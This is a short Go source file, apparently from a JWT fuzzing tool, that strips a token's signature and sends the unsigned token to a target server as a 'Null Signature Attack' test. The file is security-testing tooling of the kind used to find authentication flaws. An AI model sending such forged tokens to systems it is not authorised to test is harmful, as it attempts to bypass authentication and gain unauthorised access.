package cmd

import (
	"fmt"

	"github.com/malsuke/jwt-fuzzer/internal/request"
)

func (j *JWT) nullSig() {
	j.Signature = ""
}

func nullSigTest(client request.Client, jwt JWT) error {
	jwt.nullSig()
	body := jwt.EncodeToString()

	fmt.Printf("\033[31mTEST Null Signature Attack\033[0m\n")
	fmt.Printf("[+] %s\n", body)

	request.RequestWithJWT(client, body)
	return nil
}
